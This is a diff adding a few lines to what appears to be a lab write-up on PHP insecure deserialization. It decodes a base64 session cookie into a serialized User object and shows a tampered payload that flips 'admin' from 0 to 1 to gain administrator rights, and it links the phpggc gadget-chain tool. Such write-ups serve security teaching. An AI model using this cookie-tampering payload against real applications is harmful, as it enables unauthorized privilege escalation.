@@ -260,6 +260,11 @@ Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=
 Base64 decoded
 O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
 ```
+As we can see there is a field key called `admin` with one boolean filed value 0 -> False. 
+Changing the boolean value to 1 automatically we are going to be a administrator.
+```
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
+```
 
 [phpggc](https://github.com/ambionics/phpggc)
 
